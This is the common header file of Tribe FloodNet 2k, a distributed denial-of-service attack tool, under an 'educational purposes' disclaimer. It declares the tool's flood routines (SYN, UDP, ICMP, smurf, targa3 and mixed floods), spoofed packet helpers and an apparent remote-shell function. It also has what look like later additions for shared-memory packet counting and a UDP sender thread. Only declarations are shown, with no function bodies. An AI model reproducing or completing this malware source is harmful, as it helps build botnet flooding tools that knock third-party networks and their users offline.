/*
 * Tribe FloodNet - 2k edition
 * by Mixter <mixter@newyorkoffice.com>
 *
 * tribe.c - common definitions and includes
 *
 * This program is distributed for educational purposes and without any
 * explicit or implicit warranty; in no event shall the author or
 * contributors be liable for any direct, indirect or incidental damages
 * arising in any way out of the use of this software.
 *
 */

#ifndef TRIBE_H
#define TRIBE_H

#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/shm.h>


int rand (void);		/* standard function prototypes */
unsigned short get_ipid();
unsigned short get_sport();
long int random (void);
void srandom (unsigned int seed);
void srand (unsigned int seed);
int atoi (const char *nptr);
int system (const char *string);
char *getpass (const char *prompt);
char *strtok (char *s, const char *delim);
void *calloc (size_t nmemb, size_t size);
void *malloc (size_t size);
void free (void *ptr);
/* void bzero (void *s, int n); */
#if 0
void *memset (void *s, int c, size_t n);
char *strncpy (char *dest, const char *src, size_t n);
int strcasecmp (const char *s1, const char *s2);
#endif

#include "ip.h"
#include "aes.h"
#include "config.h"

//char shameless_self_promotion[] = "\t\t[0;35m[tribe flood network]\t (c) 1999 by [5mMixter[0m\n\n";

#define BS 4096

void random_init (void);
int getrandom (int, int);
void trimbuf (char *);
#ifdef ATTACKLOG
void dbug (char *);
#endif

void tfntransmit (unsigned int, unsigned int, int, char, char *);

void syn2 (unsigned int, unsigned short);
void udp2 (unsigned int);
void targa3 (unsigned int);
void icmp (unsigned int, unsigned int);

unsigned int k00lip (void);
void must_kill_all (void);
void commence_udp (char *);
void commence_syn (char *, int);
void commence_icmp (char *);
void commence_mix (char *);
void commence_smurf (char *);
void commence_targa3 (char *);
void shellsex (int);

struct tribe
  {
    char start;
    char id;
    char end;
  };

struct packetmsg
{
	int totalpacket;
	int totalbyte;
};


char* getlocalIp();
void createShm();
void *thread_send(void *arg);

int udpConnect(short port,char *ip);
int socket_fd;
struct sockaddr_in sin_addr;

struct packetmsg *pmsg;
int isRun;

#endif
